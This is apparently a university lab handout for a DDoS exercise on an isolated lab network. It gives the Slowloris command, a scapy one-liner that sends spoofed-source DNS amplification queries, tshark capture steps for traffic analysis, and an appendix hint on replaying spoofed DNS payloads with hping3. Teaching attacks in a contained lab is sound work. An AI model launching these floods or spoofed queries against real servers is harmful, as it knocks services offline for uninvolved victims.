# 🖥 Lab 2B: Attack Generation(2)

continue from Attack Generation(1)

In lab 2B, we going to perform another 2 types of DDoS attack: SlowHttp and DNS Amplification.



## Slow Http Attack

In the CnC machine, ssh into one of the bots available:

| <p>#ssh 192.168.10.109 or 192.168.10.132</p><p>root@bot~# perl slowloris.pl -dns 192.168.10.112</p> |
| --------------------------------------------------------------------------------------------------- |

Wait 3\~5 minutes to see the effect. Stop this attack by hit Ctrl+C.

(Sometimes, you might see the effect on the webpage load time only after stopping the attack.)

\
DNS Amplification Attack
------------------------

DNS IP: 192.168.10.100

try: dig bighost.cu.ddos @192.168.10.100 +dnssec \
to see if DNS server works well.

First ssh to the host machine of the bot VM.\
Bot1: 192.168.10.109 Hosted on machine:192.168.10.21\
Bot2: 192.168.10.132 Hosted on machine:192.168.10.20\
Credentials posted on canvas before.\


Then capture the traffic(original request packets). The MAC address in the filter should be the MAC address of the host machine\
192.168.10.21 - f0:4d:a2:ea:6c:e5\
192.168.10.20 - f0:4d:a2:e9:a3:a9

| <p>$ssh usename@192.168.10.21(or 20)<br>$tshark -i enp2s0 -c 100 -f 'port 53 and not ether host f0:4d:a2:ea:6c:e5' -w {yourname}_bot_log.pcap -F libpcap</p> |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| (or the other MAC)                                                                                                                                           |



Then you can leave this terminal open until the DNS amplification attack is finished.&#x20;

Hit Ctrl+C to stop logging or wait until 100 packets are received.

Open another terminal and ssh into the victim’s host machine(192.168.10.22) and start capture traffic(amplified traffic) on victim machine(MAC:08:00:27:00:90:a6):

| $tshark -i enp2s0 -c 100 -f 'ether host 08:00:27:00:90:a6' -w {yourname}\_victim\_log.pcap -F libpcap |
| ----------------------------------------------------------------------------------------------------- |

You can leave this terminal open until the DNS amplification attack is finished.&#x20;

Hit Ctrl+C to stop logging or wait until 100 packets are received.

Then ssh into one of the bots from CnC machine and open scapy:

| <p>#ssh 192.168.10.109<br>root@bot~:# scapy<br>>>></p> |
| ------------------------------------------------------ |

Execute the following command in the scapy shell to launch a DNS amplification attack:

| >>> send(IP(src="192.168.10.112", dst="192.168.10.100")/UDP(dport=53)/DNS(qd=DNSQR(qname="bighost.cu.ddos"), ar=DNSRR(rrname=".", type=41, rclass=4096, ttl=32768)),count=10,inter=0.01,verbose=False) |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |

To exit scapy:

| >>> exit() |
| ---------- |

Or Ctrl+D

This attack might not show change in the webpage load time necessarily for you, but you can analyze the pcap log file you created on the victim and the attacker host to compare the traffic. There should be a clear difference between the two.

Hint: the number of DNS queries and the corresponding number of responses are expected to be different. Find other differences in your analysis as well.&#x20;

In addition to analyzing the traffic on wireshark, you can also read the file using tshark by running the following command on your machine:

| tshark -r \<filename> |
| --------------------- |

You should be able to compare the data of the two files to observe DNS Amplification.&#x20;



## Lab Report:

Due date given in Canvas Syllabus

Make sure you did your lab by yourself, not under other students help.\


## Appendix

Slow HTTP

The slow HTTP attack sonsumes victim webpage server by slowly sending HTTP requests. The HTTP server keeps the connection until all the webserver’s resources are consumed. That is why the slowloris attack does not affect at the very beginning but slowly makes the web server stop responding.

* Slowloris HTTP DoS [https://web.archive.org/web/20090822001255/http://ha.ckers.org/slowloris/](https://web.archive.org/web/20090822001255/http://ha.ckers.org/slowloris/)

\


DNS Amplification Attack

There are many DNS amplification attack tools available on Github. Many of them are written in python with scapy library. However, scapy is naturally very very slow. Using scapy to perform DNS amplification attacks might work when you have multiple bots and more DNS servers. As a hint, hping3 is not capable of crafting a DNS request packet, but it can be used to replay a crafted DNS payload. You can simply use dig to generate a legitimate DNS packet first, store the DNS payload only, and then send the DNS payload with a spoofed source. By using hping3, you will see the limit of a DNS server, and why the victim is not disconnected during an attack.&#x20;

* Honeypot Based monitoring of Amplification DDoS attacks.

[https://labs.ripe.net/Members/johannes\_krupp/honeypot-based-monitoring-of-amplification-ddos-attacks](https://labs.ripe.net/Members/johannes\_krupp/honeypot-based-monitoring-of-amplification-ddos-attacks)

\
